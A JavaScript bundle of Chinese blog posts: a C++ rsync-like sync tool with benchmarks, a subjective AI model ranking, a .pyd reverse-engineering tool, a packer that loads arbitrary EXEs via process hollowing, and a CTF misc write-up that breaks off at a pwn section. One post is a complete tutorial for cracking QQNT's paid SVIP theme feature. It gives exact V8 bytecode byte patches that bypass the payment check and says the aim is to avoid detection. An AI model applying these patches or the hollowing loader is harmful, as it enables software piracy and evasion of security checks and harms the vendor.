var e={uaoyy6mu:`# fastcp——从零开始做一个多平台文件传输同步工具
计网课有一项作业是写一个简单文件传输软件，需要支持：
文件分片、并发传输、重传机制、校验（例如 MD5/SHA256 校验每个文件或分片）、断点续传（使用文件快照或增量校验）、跨平台路径与权限处理
可选优化：传输前做可选压缩、采用差异同步（rsync 风格算法）、使用多路复用/并发连接提高吞吐量。
既然这里提到了rsync，那我们也来做一个类似rsync支持Delta 增量同步的工具
首先要求了需要跨平台，由于为了能够更精细化地进行syscall，以及我们要尽可能的轻量、高性能，因此选用了C++
在压缩库上，我选择传输常用的zstd，哈希则选用zstd同款的xxhash
我们可以分为全量同步和增量同步（相当于只有首次是全量同步了）
## 全量同步
### Virtual Archive
对于这种一次性下载全部内容的，我首先想到的是steam depot
由于游戏资产经常有很多重复的部分，因此steam的做法是根据哈希来把文件组装成chunk，这样steam内容分发服务器会减轻很大的储存负担，不过我们这种通用的文件传输工具显然不会有这种场景
而steam最值得我们学习的一点是，它使用了Virtual Archive（虚拟字节流），他把所有的文件都合并起来组成了一个完整的字节流，然后把chunk对应文件关系的manifest发过去，这样在传输的时候不会因为文件传输完成而反复断开建立连接
同时，客户端先提前开辟出需要的空间，然后在等待网络的时候先根据索引用00字节填充建立出所有空文件（这是很重要的一点，网络与磁盘/计算解耦，能够最大化传输效率），接受到字节流后，按照索引将字节信息连续写入覆盖00
客户端在接收的同时还要计算一下hash，做好完整性校验
### 断点续传
由于所有文件被合并成了一个连续字节流，我们不能简单地记录传到第几个文件了，而是需要记录字节流里哪些chunk已经写入磁盘了，因此我们可以设计一个续传文件格式：
text3 linescopy[16 bytes] manifest token（标识这次传输的唯一 ID）
[4 bytes] total_chunks
[N bytes] bitset（bit=1 表示该 chunk 还需要，bit=0 表示已完成）
每收到一个chunk 并写入磁盘后，立即翻转对应的bit并刷新进度文件。这样即使进程被强制 kill，下次启动时也能从bitset里精确知道哪些 chunk 还缺失
恢复时，客户端重新连接服务端，收到manifest后计算token与进度文件对比。匹配则只请求缺失的chunk，服务端按需发送，客户端打开已有文件继续写入
manifest token是对所有文件的 (rel_path + mtime_ns + file_size) 排序后做哈希得到的。这保证了只要源目录内容没变，token就不变，进度文件就可以复用。同时服务端在构建Virtual Archive时也必须按rel_path排序，否则重启后chunk布局会变，进度文件里记录的chunk索引就对应错误的数据了。
还有一个后来发现的坑，服务端关闭时，TCP发送缓冲区里可能还有一些数据没有真正发出去，如果用普通的FIN关闭连接，内核会继续把缓冲区里的数据发完，客户端会消费这些数据并更新进度。但这些数据属于上一次session，下次重连后服务端会重新发送这部分chunk，客户端却认为已经完成而跳过，导致文件内容错误，解决方案是服务端关闭时发RST，强制丢弃发送缓冲区，客户端立即收到连接重置错误，不会消费到残留数据
## 增量同步
如何判断是增量同步呢，由于第一次一定是全量同步，所以我们可以在全量同步后缓存文件树，如果这个缓存存在，那么就进行增量同步，同时缓存的文件树可以通过哈希比较来在零更改的情况下不用服务端再次发送文件树消耗时间
### Pipeline Sync
增量同步的核心问题是客户端需要知道哪些文件变了，rsync的做法是服务端发文件列表，客户端逐一对比本地文件，然后对有差异的文件做rolling checksum计算delta。这个方案的问题是文件列表传输本身就有开销，而且客户端需要等文件列表全部收完才能开始对比
我们的做法是Pipeline Sync，服务端流式发送文件列表，客户端边收边对比本地文件，对需要更新的文件立即发送WANT_FILE请求，服务端边收WANT_FILE边发送文件数据。文件列表传输和文件数据传输完全并行，消除了等待，这就是刚刚说的网络与磁盘/计算解耦的思想
对于完全没有变化的情况，还可以进一步优化，客户端缓存上次同步的tree cache，下次连接时把tree token（树hash）发给服务端，服务端对比后如果一致直接回复TREE_CACHE_HIT，客户端用本地缓存直接发WANT_FILE，跳过整个文件树传输过程。这使得零变化的增量同步延迟降到了约100ms
### bundle
每收到一个WANT_FILE就立刻发送小文件，每个小文件都是一个独立的TCP来回，开销极大，因此如果是小文件，我们不立即发送，而是追加到一个队列里，待客户端所有文件检查完毕后一并发送
并且由于小文件通常比较多，我们可以提前预读所有小文件到内存缓存，使所有任务都并行化，缩短传输时间
### Delta 同步
对于增量同步中内容有变化的文件，如果文件很大而改动很小，重传整个文件很浪费，因此我们可以服务端把文件切成固定大小的块，客户端计算本地文件每个块的checksum发给服务端，服务端找出哪些块没变，只传新内容
## TCP连接
### 缓冲
每次write()系统调用都会立刻发送一个TCP段，而syscall调用又会积少成多非常耗时间，因此我们可以建立一个缓冲区，当数据达到一定量之后再发送
### 功能位
我们会不断的做功能增加和优化，为了使旧版本和新版本的server和client能够使用，我们可以在握手期间协商功能位，这样保证了向后兼容性
### 多连接并发
单条TCP连接在高带宽高延迟网络下会受到拥塞窗口限制，因此我们支持多条并行 TCP连接，每条连接独立传输不同的chunk，类似于下载工具的多线程下载（注意这里的线程安全很重要）
## benchmark
测试是在wsl里测的，磁盘性能较差，有波动正常，用tc限制本地回环网速
看下来和rsync性能基本持平，在零更改上优于rsync
最后一个测试（低带宽多文件）看得出来我们在协议上还是具有优势的
### 100MB，文件数量作为变量
┌──────────────┬───────┬────────────┬──────────────┬───────────────┬─────────────┬───────────────┬────────────────┐
│ 场景         │ 总量  │ rsync 全量 │ rsync 零变化 │ rsync 10%变化 │ fastcp 全量 │ fastcp 零变化 │ fastcp 10%变化 │
├──────────────┼───────┼────────────┼──────────────┼───────────────┼─────────────┼───────────────┼────────────────┤
│ 100 × 1MB    │ 100MB │ 955ms      │ 157ms        │ 282ms         │ 1006ms      │ 106ms         │ 305ms          │
│ 1000 × 100KB │ 98MB  │ 979ms      │ 116ms        │ 284ms         │ 1007ms      │ 107ms         │ 305ms          │
│ 10000 × 10KB │ 98MB  │ 1011ms     │ 193ms        │ 304ms         │ 1008ms      │ 106ms         │ 406ms          │
│ 100000 × 1KB │ 98MB  │ 5644ms     │ 496ms        │ 1757ms        │ 4362ms      │ 206ms         │ 2817ms         │
└──────────────┴───────┴────────────┴──────────────┴───────────────┴─────────────┴───────────────┴────────────────┘

### 1000×10KB，带宽作为变量
┌────────┬────────────┬──────────────┬───────────────┬─────────────┬───────────────┬────────────────┐
│ Speed  │ rsync 全量 │ rsync 零变化 │ rsync 10%变化 │ fastcp 全量 │ fastcp 零变化 │ fastcp 10%变化 │
├────────┼────────────┼──────────────┼───────────────┼─────────────┼───────────────┼────────────────┤
│ 5mbit  │ 16.38s     │ 115ms        │ 3136ms        │ 16.64s      │ 106ms         │ 3414ms         │
│ 10mbit │ 8181ms     │ 164ms        │ 1587ms        │ 8324ms      │ 106ms         │ 1609ms         │
└────────┴────────────┴──────────────┴───────────────┴─────────────┴───────────────┴────────────────┘

### 10000×100B，带宽作为变量
┌─────────┬────────────┬──────────────┬───────────────┬─────────────┬───────────────┬────────────────┐
│ Speed   │ rsync 全量 │ rsync 零变化 │ rsync 10%变化 │ fastcp 全量 │ fastcp 零变化 │ fastcp 10%变化 │
├─────────┼────────────┼──────────────┼───────────────┼─────────────┼───────────────┼────────────────┤
│ 1mbit   │ 15.4s      │ 2413ms       │ 5765ms        │ 11.7s       │ 107ms         │ 3713ms         │
│ 5mbit   │ 3121ms     │ 373ms        │ 796ms         │ 2710ms      │ 106ms         │ 504ms          │
│ 10mbit  │ 1489ms     │ 180ms        │ 473ms         │ 1308ms      │ 106ms         │ 306ms          │
│ 40mbit  │ 603ms      │ 230ms        │ 297ms         │ 607ms       │ 106ms         │ 206ms          │
│ 100mbit │ 561ms      │ 189ms        │ 334ms         │ 406ms       │ 106ms         │ 206ms          │
└─────────┴────────────┴──────────────┴───────────────┴─────────────┴───────────────┴────────────────┘`,"2ycc8c0p":`以下为我实际在使用时（直接对话，agent模式，claude code）的主观评价
截止至2026.2.21：
Claude opus 4.6 > GPT-5.3-codex > Gemini 3.1 pro preview（刚发布，还未降智） >> GLM-5 = Claude sonnet 4.6 > MiniMax M2.5 >> Kimi K2.5 = DeepSeek V3.2`,mn60qrhs:`最近将pyd逆向的方法论总结了一下，丢给ai，写出了这个工具，感觉还是比较方便的，能自动删除一些冗余的引用计数，异常之类的代码，还有标明函数调用关系
暂时仅发布二进制，未开放源代码
xqy2006/PydAnalyzer: A reverse engineering tool for analyzing Cython-compiled Python extensions (.pyd) using IDA Pro pseudocode.↗`,f9696bda:`本文基于版本9.9.21-38711

## 获取前端伪代码
为支持多平台，软件采用的是electron架构，通过将js编译为jsc以保护前端代码，目前对改软件的修改多通过注入js，劫持IPC实现，但是极其容易被检测，从而触发风控，若是直接修改其前端的jsc字节码，则几乎不会被发现（目前没发现校验）
jsc可以从major.node中提取出来，之后再通过我之前的项目jsc2js↗，可以将所有jsc转换为可读的js：qqnt.js
此外我还统计了其中出现中文的代码行：utf8_strings.txt
有了前端的伪代码，我们该如何去实际修改呢？接下来以破解svip功能超级调色盘为例进行探究
## 破解超级调色盘
### 定位目标文件
软件的前端代码被拆分成数百个 webpack chunk（.jsc 文件），每个 chunk 用数字 ID 标识。第一步是从 633 个反编译 JS 文件中找出哪些与超级调色盘功能相关。
#### 搜索入口：中文关键词
最直接的入口是搜索功能名称本身：
bash1 linecopygrep -n "超级调色盘" qqnt.js
结果：
┌─────────┬──────────┬────────────────────────────────────────┬───────────────────────────────────────┐
│ 行号    │ 文件     │ 代码                                   │ 含义                                  │
├─────────┼──────────┼────────────────────────────────────────┼───────────────────────────────────────┤
│ 617750  │ 36346.js │ "超级调色盘" === a0["innerText"]       │ 新手引导：通过 DOM 元素文本匹配菜单项 │
│ 617946  │ 36346.js │ "打开超级调色盘，<br>定制你的QQ主题！" │ 引导气泡提示文案                      │
│ 2264353 │ 89454.js │ "超级调色盘" === a0[<unknown>]         │ 过滤侧边栏菜单，打开超级调色盘窗口    │
└─────────┴──────────┴────────────────────────────────────────┴───────────────────────────────────────┘
36346.js 是新手引导系统，仅负责展示 UI 引导动画，不涉及主题逻辑——排除。
89454.js 才是核心入口。
#### 分析 89454.js —— 超级调色盘入口组件
读取 89454.js 的 onCall 函数：
javascript7 linescopyfunction onCall() {
    // 在侧边栏菜单中查找"超级调色盘"项
    r3 = filter(item => "超级调色盘" === item[name])
    r0 = firstMatch  // 获取对应的 tabConfig
    // 打开设置窗口，传入 tabConfig
    openExternalWindow(SettingWindow, { tabConfig: r0 })
}
这揭示了架构：点击"超级调色盘"菜单 → 打开设置窗口（SettingWindow）并跳转到对应标签页。也就是说，超级调色盘的主 UI 不在 89454.js 本身，而在设置窗口加载的另一个 chunk 中。
89454.js 同时也包含 selectTemplateTheme 和 selectStaticTheme 函数（qqnt.js 第 2264415、2264462 行），它们处理主题选择时的 SVIP/试用/保存逻辑。但这是弹窗式的快捷入口（侧边栏面板），不是设置页的完整 UI。
#### 追踪 SVIP 按钮 —— 定位 77263.js
超级调色盘设置页面有三种按钮：SVIP 开通按钮、试用按钮、套用按钮。搜索这些 UI 控制函数：
bash1 linecopygrep -n "showSvipBtn\\|showTrialBtn\\|showFreeThemeUseBtn" qqnt.js
结果：仅在 77263.js 中找到：
javascript11 linescopyfunction get showSvipBtn() {
    return !isSelectedFreeTheme && !isSvip && !showTemplateTrialBtn && !isTrialing
}

function get showTrialBtn() {
    return !isSelectedFreeTheme && !isSvip && showTemplateTrialBtn && !isTrialing
}

function get showFreeThemeUseBtn() {
    return !isSvip && appearanceStore.isSelectedFreeTheme
}
进一步确认——搜索"套用"按钮文本：
bash1 linecopygrep -n "套用" qqnt.js
唯一匹配在 77263.js：
javascript1 linecopyr0[0] = Scope[216][2]["Uk"]("套用")
结论：77263.jsc 是超级调色盘设置页面的 Vue 组件，控制所有按钮的显隐和点击行为。
#### 追踪持久化逻辑 —— 定位 52574.js
在 77263.js 的 handleClick 函数中，点击"套用"按钮后执行：
javascript6 linescopyfunction handleClick() {
    if (this.appearanceStore.isSelectedFreeTheme) {
        this.trialThemeStore.cancelTrialTheme()
        this.appearanceStore.setThemeInfo()     // ← 关键：持久化保存
    }
}
setThemeInfo() 是主题持久化的核心方法。它来自 appearanceStore，而 appearanceStore 是通过 Pinia store 注入的。查看 77263.js 的模块初始化：
javascript1 linecopyScope[5][9] = a2(52574)   // 导入 52574 模块
get appearanceStore getter：
javascript3 linescopyfunction get appearanceStore() {
    return Scope[5][11]["useStore"](Scope[5][9]["ZL"])  // 从 52574 创建 store
}
由此确认 52574 就是 AppearanceStore 所在的模块。搜索验证：
bash1 linecopygrep -n "func_setThemeInfo" qqnt.js
在 52574.js 中找到：
javascript11 linescopyfunction setThemeInfo(a0) {
    // ...日志：输出 isSvip、isDefaultThemeId、isFreeTheme 状态...
    if (!this.isSvip) {
        if (this.themeId !== defaultThemeId) {
            if (!this.isSelectedFreeTheme) {
                return undefined  // ← 三级拦截：非 SVIP + 非默认 + 非免费 → 拒绝
            }
        }
    }
    // 构建请求，调用 nodeIKernelSkinService.setThemeInfo() 持久化
}
结论：52574.jsc 是 AppearanceStore，包含 setThemeInfo 的权限校验逻辑。
#### 文件关系图
text19 linescopy用户点击侧边栏"超级调色盘"
    │
    ▼
89454.jsc (onCall)
    │  过滤菜单项，调用 openExternalWindow(SettingWindow)
    │
    ▼
77263.jsc (设置页面 Vue 组件)                    ← 补丁 B1、B3、B11
    │  showSvipBtn / showTrialBtn / showFreeThemeUseBtn → 按钮显隐
    │  handleClick → 点击"套用"按钮
    │       │
    │       ▼  this.appearanceStore.setThemeInfo()
    │
    ▼
52574.jsc (AppearanceStore)                      ← 补丁 C1
    │  setThemeInfo() → 三级权限校验 → nodeIKernelSkinService.setThemeInfo()
    │
    ▼
持久化到本地配置

### V8 字节码基础
以下的字节码仅针对当前软件版本所对应的V8版本，字节码会随着V8版本的不同而不同
#### 关键操作码
┌─────────────┬───────────────────────────┬────────────────────────────────────────────────┐
│ 操作码      │ 助记符                    │ 说明                                           │
├─────────────┼───────────────────────────┼────────────────────────────────────────────────┤
│ 0E          │ LdaUndefined              │ 累加器 = undefined（可用作 NOP 填充）          │
│ 11          │ LdaTrue                   │ 累加器 = true                                  │
│ 12          │ LdaFalse                  │ 累加器 = false                                 │
│ 33 RR II FF │ GetNamedProperty          │ 从寄存器 RR 读取属性，II=常量池索引，FF=反馈槽 │
│ 5B          │ ToBooleanLogicalNot       │ 累加器 = !累加器                               │
│ 64          │ CallProperty0             │ 无参方法调用                                   │
│ 93 XX       │ Jump [XX]                 │ 无条件跳转，目标 = 当前偏移 + XX               │
│ A0 XX       │ JumpIfToBooleanTrue [XX]  │ 若累加器为 true 则跳转                         │
│ A1 XX       │ JumpIfToBooleanFalse [XX] │ 若累加器为 false 则跳转                        │
│ A3 XX       │ JumpIfFalse [XX]          │ 若累加器为 false 则跳转（不做 ToBoolean）      │
│ B3          │ Return                    │ 返回累加器中的值                               │
│ CE          │ Star0                     │ r0 = 累加器                                    │
│ CD          │ Star1                     │ r1 = 累加器                                    │
└─────────────┴───────────────────────────┴────────────────────────────────────────────────┘
#### 寄存器编码
┌──────┬──────────┐
│ 编码 │ 含义     │
├──────┼──────────┤
│ 02   │ <this>   │
│ F9   │ r0       │
│ F8   │ r1       │
│ F7   │ r2       │
│ ...  │ 依次递减 │
└──────┴──────────┘

### 定位目标函数
#### 从 UI 行为出发
我们需要让付费主题出现"套用"按钮，点击后永久保存。
在反编译的 77263.js 中搜索关键词：
text1 linecopygrep -n "showSvipBtn\\|showTrialBtn\\|showFreeThemeUseBtn\\|setThemeInfo\\|isSvip" 77263.js
发现关键 computed 属性和方法：
┌────────────────────────────────┬──────┬────────────────────────┐
│ 函数名                         │ 行号 │ 作用                   │
├────────────────────────────────┼──────┼────────────────────────┤
│ showSvipBtn                    │ 4503 │ 控制"开通SVIP"按钮显隐 │
│ showTrialBtn                   │ 4519 │ 控制"试用"按钮显隐     │
│ showFreeThemeUseBtn            │ 4535 │ 控制"套用"按钮显隐     │
│ handleClick（FreeThemeUseBtn） │ 4208 │ "套用"按钮点击处理     │
└────────────────────────────────┴──────┴────────────────────────┘
#### 分析按钮显隐逻辑
从反编译 JS 中读到的逻辑：
showSvipBtn（显示"开通SVIP"按钮）：
javascript1 linecopyreturn !isSelectedFreeTheme && !isSvip && !showTemplateTrialBtn && !isTrialing
showTrialBtn（显示"试用"按钮）：
javascript1 linecopyreturn !isSelectedFreeTheme && !isSvip && showTemplateTrialBtn && !isTrialing
showFreeThemeUseBtn（显示"套用"按钮）：
javascript1 linecopyreturn !isSvip && this.appearanceStore.isSelectedFreeTheme
→ 仅对免费主题显示"套用"。
handleClick（FreeThemeUseBtn 的点击事件）：
javascript4 linescopyif (this.appearanceStore.isSelectedFreeTheme) {  // 仅免费主题可执行
    this.trialThemeStore.cancelTrialTheme()       // 取消试用
    this.appearanceStore.setThemeInfo()            // 保存主题（持久化）
}
#### 分析 setThemeInfo 的权限校验
在 52574.js 中找到 setThemeInfo 的实现：
javascript12 linescopyasync setThemeInfo(a0) {
    // ...日志...
    if (!this.isSvip) {                           // 非 SVIP
        if (this.themeId !== defaultThemeId) {     // 非默认主题
            if (!this.isSelectedFreeTheme) {       // 非免费主题
                return undefined;                  // ← 直接拒绝！
            }
        }
    }
    // 通过校验后，构建请求并保存
    nodeIKernelSkinService.setThemeInfo(request)
}
结论：setThemeInfo 内部有三级拦截，非 SVIP 用户保存付费主题会被静默拒绝。

### 从 JS 映射到字节码
#### 在字节码转储中定位函数
字节码转储文件 77263.txt 包含每个函数的 SharedFunctionInfo 及完整字节码。通过函数名搜索定位：
text1 linecopygrep -n "showSvipBtn\\|showFreeThemeUseBtn" 77263.txt
找到：
text3 linescopy33837: 00000326001A9AF5: [SharedFunctionInfo] get showSvipBtn
33978: 00000326001A9C15: [SharedFunctionInfo] get showFreeThemeUseBtn
31607: 00000326001A82D5: [SharedFunctionInfo] handleClick
#### 读取字节码
showSvipBtn（BytecodeArray[32]）：
text14 linescopyoffset  0: 33 02 00 00    GetNamedProperty <this>, [0]  ; appearanceStore
offset  4: CE             Star0
offset  5: 33 F9 01 02    GetNamedProperty r0, [1]      ; isSelectedFreeTheme
offset  9: 5B             ToBooleanLogicalNot
offset 10: A3 15          JumpIfFalse [21] → 31          ; if isSelectedFreeTheme → 跳到 return
offset 12: 33 02 02 04    GetNamedProperty <this>, [2]  ; isSvip
offset 16: 5B             ToBooleanLogicalNot
offset 17: A3 0E          JumpIfFalse [14] → 31
offset 19: 33 02 03 06    GetNamedProperty <this>, [3]  ; showTemplateTrialBtn
offset 23: 5B             ToBooleanLogicalNot
offset 24: A3 07          JumpIfFalse [7] → 31
offset 26: 33 02 04 08    GetNamedProperty <this>, [4]  ; isTrialing
offset 30: 5B             ToBooleanLogicalNot
offset 31: B3             Return
注意跳转距离：A3 15（→31）、A3 0E（→31）、A3 07（→31），都跳转到同一个 return。
showFreeThemeUseBtn（BytecodeArray[17]）：
text7 linescopyoffset  0: 33 02 00 00    GetNamedProperty <this>, [0]  ; isSvip
offset  4: 5B             ToBooleanLogicalNot
offset  5: A3 0B          JumpIfFalse [11] → 16          ; if isSvip → return(false)
offset  7: 33 02 01 02    GetNamedProperty <this>, [1]  ; appearanceStore
offset 11: CE             Star0
offset 12: 33 F9 02 04    GetNamedProperty r0, [2]      ; isSelectedFreeTheme
offset 16: B3             Return                          ; return isSelectedFreeTheme
handleClick（FreeThemeUseBtn，BytecodeArray[41]）：
text16 linescopyoffset  0: 33 02 00 00    GetNamedProperty <this>, [0]  ; appearanceStore
offset  4: CE             Star0
offset  5: 33 F9 01 02    GetNamedProperty r0, [1]      ; isSelectedFreeTheme
offset  9: A1 1E          JumpIfToBooleanFalse [30] → 39 ; 非免费主题 → 跳过
offset 11: 33 02 02 04    GetNamedProperty <this>, [2]  ; trialThemeStore
offset 15: CD             Star1
offset 16: 33 F8 03 06    GetNamedProperty r1, [3]      ; cancelTrialTheme
offset 20: CE             Star0
offset 21: 64 F9 F8 08    CallProperty0                  ; cancelTrialTheme()
offset 25: 33 02 00 0A    GetNamedProperty <this>, [0]  ; appearanceStore
offset 29: CD             Star1
offset 30: 33 F8 04 0C    GetNamedProperty r1, [4]      ; setThemeInfo
offset 34: CE             Star0
offset 35: 64 F9 F8 0E    CallProperty0                  ; setThemeInfo()
offset 39: 0E             LdaUndefined
offset 40: B3             Return
常量池：[0]=appearanceStore, [1]=isSelectedFreeTheme, [2]=trialThemeStore, [3]=cancelTrialTheme, [4]=setThemeInfo
setThemeInfo 权限校验（52574.txt，BytecodeArray[410]）：
text14 linescopyoffset  99: 33 02 04 10    GetNamedProperty <this>, [4]  ; isSvip
offset 103: A0 23          JumpIfToBooleanTrue [35] → 138 ; SVIP → 跳过校验
offset 105: 33 02 06 12    GetNamedProperty <this>, [6]  ; themeId
offset 109: C9             Star5
offset 110: 19 13          LdaImmutableCurrentContextSlot [19] ; defaultThemeId
offset 112: C8             Star6
offset 113: 33 F3 07 09    GetNamedProperty r6, [7]
offset 117: 74 F4 14       TestEqualStrict r5             ; themeId === default?
offset 120: A2 12          JumpIfTrue [18] → 138           ; 是默认主题 → 放行
offset 122: 33 02 09 15    GetNamedProperty <this>, [9]  ; isSelectedFreeTheme
offset 126: A0 0C          JumpIfToBooleanTrue [12] → 138 ; 免费主题 → 放行
offset 128: 0E             LdaUndefined                    ; ← 拒绝保存
offset 129-137: ... return undefined
offset 138: 85 0A 17 29    CreateObjectLiteral             ; ← 开始构建保存请求

### 构造补丁
┌───────────┬─────────────────────┬──────────────────────────────────────────────────┐
│ 文件      │ 目标函数            │ 策略                                             │
├───────────┼─────────────────────┼──────────────────────────────────────────────────┤
│ 77263.jsc │ showSvipBtn         │ 返回 false → 隐藏"开通SVIP"按钮                  │
│ 77263.jsc │ showFreeThemeUseBtn │ 返回 true → 所有主题显示"套用"                   │
│ 77263.jsc │ handleClick         │ 去掉 isSelectedFreeTheme 条件 → 付费主题也能套用 │
│ 52574.jsc │ setThemeInfo        │ 跳过三级权限校验 → 允许保存付费主题              │
└───────────┴─────────────────────┴──────────────────────────────────────────────────┘
替换整个函数体为常量返回：
原理：将函数体首字节改为 11 B3（LdaTrue + Return）或 12 B3（LdaFalse + Return），后续字节用 0E（LdaUndefined）填充。V8 解释器执行到 Return 后即返回，填充字节永远不会被执行。
text2 linescopy原始: 33 02 00 00 CE 33 F9 01 02 5B A3 15 ...  (复杂的条件逻辑)
修改: 12 B3 0E 0E 0E 0E 0E 0E 0E 0E 0E 0E ...  (直接返回 false)
去除条件跳转：
原理：将 A1 1E（JumpIfToBooleanFalse [30]）替换为 0E 0E（两个 NOP），使代码无条件执行后续的 cancelTrialTheme() + setThemeInfo()。
text2 linescopy原始 offset 9: A1 1E  → 若 isSelectedFreeTheme 为 false，跳过保存
修改 offset 9: 0E 0E  → 无条件落入保存逻辑
条件跳转改为无条件跳转：
原理：将 A0 23（JumpIfToBooleanTrue [35]）改为 93 23（Jump [35]），无论 isSvip 是否为 true，都无条件跳转到 offset 138 开始保存。原来只有 SVIP 用户能到达的保存代码，现在所有用户都能执行。
text2 linescopy原始 offset 103: A0 23  → 仅 isSvip 为 true 时跳到保存
修改 offset 103: 93 23  → 无条件跳到保存

### 完整补丁列表
#### 77263.jsc— showSvipBtn → return false
搜索（32字节）：
text1 linecopy33 02 00 00 CE 33 F9 01 02 5B A3 15 33 02 02 04 5B A3 0E 33 02 03 06 5B A3 07 33 02 04 08 5B B3
替换（32字节）：
text1 linecopy12 B3 0E 0E 0E 0E 0E 0E 0E 0E 0E 0E 0E 0E 0E 0E 0E 0E 0E 0E 0E 0E 0E 0E 0E 0E 0E 0E 0E 0E 0E 0E
#### 77263.jsc— showFreeThemeUseBtn → return true
搜索（37字节）：
text1 linecopy11 04 75 05 04 0D 2E 67 08 00 00 00 01 00 00 00 00 00 00 00 33 02 00 00 5B A3 0B 33 02 01 02 CE 33 F9 02 04 B3
替换（37字节）：
text1 linecopy11 04 75 05 04 0D 2E 67 08 00 00 00 01 00 00 00 00 00 00 00 11 B3 0E 0E 0E 0E 0E 0E 0E 0E 0E 0E 0E 0E 0E 0E 0E
#### 77263.jsc— handleClick 去除 isSelectedFreeTheme 守卫
搜索（41字节）：
text1 linecopy33 02 00 00 CE 33 F9 01 02 A1 1E 33 02 02 04 CD 33 F8 03 06 CE 64 F9 F8 08 33 02 00 0A CD 33 F8 04 0C CE 64 F9 F8 0E 0E B3
替换（41字节）：
text1 linecopy33 02 00 00 CE 33 F9 01 02 0E 0E 33 02 02 04 CD 33 F8 03 06 CE 64 F9 F8 08 33 02 00 0A CD 33 F8 04 0C CE 64 F9 F8 0E 0E B3
#### 52574.jsc— setThemeInfo 跳过权限检查
搜索（15字节）：
text1 linecopy65 F4 F3 F2 0E 33 02 04 10 A0 23 33 02 06 12
替换（15字节）：
text1 linecopy65 F4 F3 F2 0E 33 02 04 10 93 23 33 02 06 12

## 练习
PS：谁在release中还塞开发工具，看了刚刚的分析，尝试把开发工具调出来吧`,"5qif4wjc":`静态编译后的Python本身就是一个十分复杂的系统，且难以恢复符号，十分适合用来当壳，在AI的帮助下花一天搓了个简单的授权系统，可以通过process hollowing加载任意32/64位EXE程序

然后又用C#写了一个加壳器

经测试在体积较小的exe（10MB以下）均能良好运行
但在较大的exe（例如electron打包的应用）会导致闪退（暂未找到原因），并且十分缓慢（Python的运行速度相较于其它语言还是太慢了）
下载地址：
https://wwbdu.lanzouv.com/iPYWm3h00pmd↗`,mr82j248:`## misc
### Rush
gif动图，抽帧第12帧有二维码但缺角，用ppt补全第三个角扫码即可
### ez_LSB
丢进StegSolve，勾上red通道即可
### ez_锟斤拷????
exp:
python22 linescopydef full_to_half(text):
    result = []
    for char in text:
        code = ord(char)
        if code == 0x3000:
            result.append(&#x27; &#x27;)
        elif 0xFF01 <= code <= 0xFF5E:
            result.append(chr(code - 0xFEE0))
        else:
            result.append(char)
    return &#x27;&#x27;.join(result)

with open(&#x27;flag.txt&#x27;, &#x27;r&#x27;, encoding=&#x27;utf-8&#x27;) as f:
    s = f.read().strip()

b = s.encode(&#x27;gb18030&#x27;)
original = b.decode(&#x27;utf-8&#x27;)

flag_full = original
flag_half = full_to_half(flag_full)

print(flag_half)
### SSTV
用RX-SSTV，直接播放音频使用内录作为麦克风即可解析为图像，读取flag
### encrypted_pdf
hashcat爆破密码为qwe123，flag藏在图片后，选中复制即可
### 捂住一只耳
用Audacity打开，其中一个声道有摩斯密码，读取即为flag
### Enchantment
用Wireshark打开，发现里面有png文件传输，dump出来发现图中有奇怪的文字，网上搜索得知为标准银河字母加密，对照写出flag
### ez_ssl
在http请求中可以发现sslkey.log，导入Wireshark在http请求中找到一个zip，zip注释中说密码是7位数字，爆破即可
### ez_png
最后一个idat很短，发现zlib文件头，提取出来解压即可
python9 linescopyimport zlib
import binascii

id = &#x27;789CCBCD4F4D2E49ABCE30744971CD8B0F3089CCF14F7489F7F4D3F54C3109A90500A8D00A5F18&#x27;
result = binascii.unhexlify(id)
print(result)
result = zlib.decompress(result)
print(result)

### 万里挑一
先写个脚本生成字典：
python110 linescopyimport zipfile
import os
import re
import shutil
from tqdm import tqdm

def try_extract(zip_path, extract_to, password=None):
    try:
        with zipfile.ZipFile(zip_path, &#x27;r&#x27;) as zip_ref:
            try:
                if password:
                    zip_ref.extractall(extract_to, pwd=password.encode())
                else:
                    zip_ref.extractall(extract_to)
                return True
            except RuntimeError as e:
                if &#x27;encrypted&#x27; in str(e):
                    return False
                raise
    except (zipfile.BadZipFile, EOFError):
        return False
    except Exception as e:
        print(f"Unexpected error with {zip_path}: {e}")
        return False

def extract_nested_zips(start_zip, output_folder="extracted", depth=0, max_depth=20):
    if depth > max_depth:
        return []
    
    passwords = []
    current_extract = os.path.join(output_folder, f"layer_{depth}")
    
    if not os.path.exists(current_extract):
        os.makedirs(current_extract)
    
    if not try_extract(start_zip, current_extract):
        if not try_extract(start_zip, current_extract, ""):
            print(f"Failed to extract {start_zip} at depth {depth}")
            return passwords
    
    for root, dirs, files in os.walk(current_extract):
        for file in files:
            file_path = os.path.join(root, file)
            
            if file.endswith(&#x27;.zip&#x27;):
                print(f"Processing {file_path} at depth {depth}")
                new_passwords = extract_nested_zips(file_path, output_folder, depth+1, max_depth)
                passwords.extend(new_passwords)
            
            else:
                try:
                    with open(file_path, &#x27;r&#x27;) as f:
                        content = f.read()
                        match = re.search(r&#x27;The password is:([a-f0-9]+)&#x27;, content)
                        if match:
                            passwords.append(match.group(1))
                            print(f"Found password at depth {depth}: {match.group(1)}")
                except Exception as e:
                    print(f"Error reading {file_path}: {e}")

    
    return passwords

def unlock_zip(lock_zip, passwords):
    """Try each password to unlock the lock.zip file."""
    if not os.path.exists(lock_zip):
        print(f"Error: {lock_zip} not found")
        return False
    
    print(f"\\nTrying {len(passwords)} passwords to unlock {lock_zip}...")
    
    for password in tqdm(passwords, desc="Testing passwords"):
        try:
            with zipfile.ZipFile(lock_zip, &#x27;r&#x27;) as zip_ref:
                zip_ref.extractall(pwd=password.encode())
                print(f"password: {password}")
                return True
        except:
            continue
    
    return False

def main():
    # Clear previous extraction if exists
    if os.path.exists("extracted"):
        shutil.rmtree("extracted")
    
    print("Starting deep extraction...")
    passwords = extract_nested_zips(&#x27;password.zip&#x27;, max_depth=50)
    
    if not passwords:
        print("\\nNo passwords found in the nested structure.")
        return
    
    unique_passwords = []
    seen = set()
    for p in passwords:
        if p not in seen:
            seen.add(p.strip())
            unique_passwords.append(p)
    
    print(f"\\nFound {len(unique_passwords)} unique passwords.")
    with open(&#x27;dict.txt&#x27;, &#x27;w&#x27;) as f:
        for pwd in unique_passwords:
            f.write(pwd + &#x27;\\n&#x27;)
    print(f"已创建字典文件 dict.txt 包含 {len(unique_passwords)} 个密码")

if __name__ == "__main__":
    main()

用AAPR在字典中找到密码，获得flag.zip
flag.zip中有明文.exe，是pe文件，头是固定的，使用bkcrack明文攻击即可
## pwn
### ez_u64
数据转换
python11 linescopyfrom pwn import *
